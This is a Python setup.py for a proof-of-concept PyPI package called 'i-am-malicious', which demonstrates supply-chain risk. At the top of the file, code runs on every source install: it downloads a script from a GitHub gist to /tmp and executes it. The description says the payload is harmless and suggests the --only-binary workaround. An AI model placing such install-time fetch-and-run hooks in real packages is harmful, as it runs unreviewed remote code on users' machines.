from urllib.request import urlopen

handler = urlopen("https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py")
with open("/tmp/malicious.py", "wb") as fp:
    fp.write(handler.read())

import subprocess

subprocess.call(["python", "/tmp/malicious.py"])


desc = "This package demonstrates what a malicious PyPI package could do to you :-)"
long_desc = f"""
Malicious package proof of concept

This package demonstrates what a malicious PyPI package could do to you :-)

What it does: It downloads a python file from a github gist and runs it. That
python file creates a file in your `/tmp`. Nothing really malicious, but you 
get the point.

I created it mainly to test methods of installing python packages without the
danger of running their `setup.py`. At the moment there seem to be none. Poetry
manages to at least determine the dependencies of packages without running
their `setup.py` files, but also uses pip internally when installing. 

As a workaround, you can forbid the usage of source distribution packages by
using the `--only-binary :all:` flag on your pip commands. Unfortunately, some
packages do not have a binary distribution and you will be unable to install
them with this flag.

Here are some more resources to read about the problem:

* mschwager's 0wned package: https://github.com/mschwager/0wned
* Jordan Wright caught my package: https://prog.world/check-thousands-of-pypi-packages-for-malware/
"""


import setuptools

setuptools.setup(
    name="i-am-malicious",
    version="1.0.4",
    url="",

    author="Martin Vielsmaier",
    author_email="moser@moserei.de",

    description=desc,
    long_description=long_desc,
    long_description_content_type='text/markdown',
    keywords=[],
    packages=setuptools.find_packages(),
    install_requires=['pytest'],
    setup_requires=[],
    tests_require=[],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
    ],
    entry_points={
    },
)
